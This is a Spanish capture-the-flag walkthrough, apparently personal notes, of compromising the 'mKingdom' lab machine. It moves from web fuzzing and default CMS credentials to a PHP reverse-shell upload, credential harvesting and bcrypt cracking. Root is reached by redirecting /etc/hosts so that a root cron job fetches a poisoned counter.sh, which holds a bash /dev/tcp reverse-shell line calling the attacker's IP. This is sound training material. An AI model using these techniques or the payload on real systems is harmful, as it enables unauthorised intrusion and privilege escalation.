Realizamos un escaneo de nmap
![[Pasted image 20240619114827.png]]

Al acceder a la web encontramos una imagen
![[Pasted image 20240619114930.png]]

Haremos fuzzing web para descubrir posibles directorios y ficheros ocultos
```Bash
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.108.219:85/FUZZ
```
![[Pasted image 20240619115433.png]]

Vemos que aparece un direcctorio llamado app, al acceder nos aparece un boton, al clickarle nos reubica a una nueva web, vamos a analizarlas
![[Pasted image 20240619115719.png]]

Nos ha encontrado otra url que también analizaremos
![[Pasted image 20240619120216.png]]

Aquí si que hemos obtenido mas información, analizamos las url y encontramos que en concrete tenemos acceso a la web
![[Pasted image 20240619120236.png|500]]

Continuando revisando la información encontramos el cms y su version
![[Pasted image 20240619121306.png]]

Revisamos posibles vulnerabilidades y encontramos las siguientes
![[Pasted image 20240619121555.png]]

Continuando por otra parte accedemos al panel de login
![[Pasted image 20240619130310.png]]

Probamos a acceder con las contraseñas por defecto
admin:password y obtenemos acceso al CMS
![[Pasted image 20240619130405.png]]

Ahora buscaremos obtener una reverse shell, intentamos cargar la shell pero nos indica que el formato no es valido
![[Pasted image 20240619131548.png]]

Para ello vamos a los ajustes y permitimos subir la revere shell
![[Pasted image 20240619131648.png]]

Ahora si que podemos subir el fichero
![[Pasted image 20240619131720.png]]
![[Pasted image 20240619131816.png]]

Ahora preparamos netcat y ejecutamos el fichero php
![[Pasted image 20240619132521.png]]

Al ejecutarlo obtenemos la webshell PHP
![[Pasted image 20240619132435.png]]

Ahora nos transferimos la shell y generamos una TTY estable
![[Pasted image 20240619133348.png]]

Revisamos los permisos y encontramos que podemos ejecutar el comando cat
![[Pasted image 20240619135120.png]]

Buscando información encontramos unas credenciales
![[Pasted image 20240619134944.png]]

Probamos las credeciales y ya tenemos acceso al usuario toad
![[Pasted image 20240619135038.png]]

Revisamos el directorio de toad
![[Pasted image 20240619135413.png]]

Leemos el archivo .bashrc y encontramos unas credenciales en base64
![[Pasted image 20240619142830.png]]

Lo decodificamos y obtenemos unas credenciales
![[Pasted image 20240619142932.png]]


Las probamos para acceder al usuario de Mario y ya estamos dentro
![[Pasted image 20240619143016.png]]

Utilizando la herramienta de [[Pspy64]] encontramos un archivo llamado counter.sh
![[Pasted image 20240619145618.png]]

Revisamos el fichero y encotramos que tiene permisos de root y que se ejecuta cada minuto
![[Pasted image 20240619145754.png]]

Ahora intentaremos cargas un payload para obtener una reverse shell como root explotando este fichero counteer.sh, para ello primero agregaremos al directorio /etc/hosts nuestra ip con el dominio de la maquina
![[Pasted image 20240620075531.png]]

Ahora crearemos un directorio identico a la ruta de counter.sh y adjuntaremos nuestra carga maliciosa,  primero creamos la misma carpeta con el archivo en nuestar maquina agregandole el payload al fichero
```
mkdir -p app/castle/application
echo "bash -c 'exec bash -i &>/dev/tcp/10.9.0.164/1234 <&1'" >> /home/wolf/MH/mkingdom/app/castle/application/counter.sh
```
![[Pasted image 20240620080244.png]]

Nos ponemos en escucha desde nuestra maquina y lanzamos un servidor de python
![[Pasted image 20240620080542.png]]

Como vemos al levantalo el servidor ira a descargarlo y si volvemos a la pestaña donde teniamos netcat habremos obtenido la reverse shell
![[Pasted image 20240620080636.png]]






------

Seguimos buscando información y encontramos que no se ha borrado el historial del archivo `.mysql_histroy`
![[Pasted image 20240619140505.png]]

Encontramos el usuario toad creado con sus contraseñas, probamos a acceder y obtenemos acceso a la base de datos
![[Pasted image 20240619140617.png]]

Ahora vamos a ver las tablas
![[Pasted image 20240619140648.png]]

Revisamos la tabla de la BBDD de mKingdom
![[Pasted image 20240619140801.png]]

Seleccionamos la tabla para trabajar con ella, revisando la información tenemos maximos privilegios en esta base de datos
![[Pasted image 20240619140833.png]]

Revismos la tabla de usuarios y encontramos la base de datos del CMS
![[Pasted image 20240619141734.png]]

Analizamos el hash y encontramos que esta cifrado con bcrypt
![[Pasted image 20240619142023.png]]

Lo crackeamos con john the ripper y obtenemos las credenciales, estas son las credenciales anteriores
![[Pasted image 20240619141954.png]]
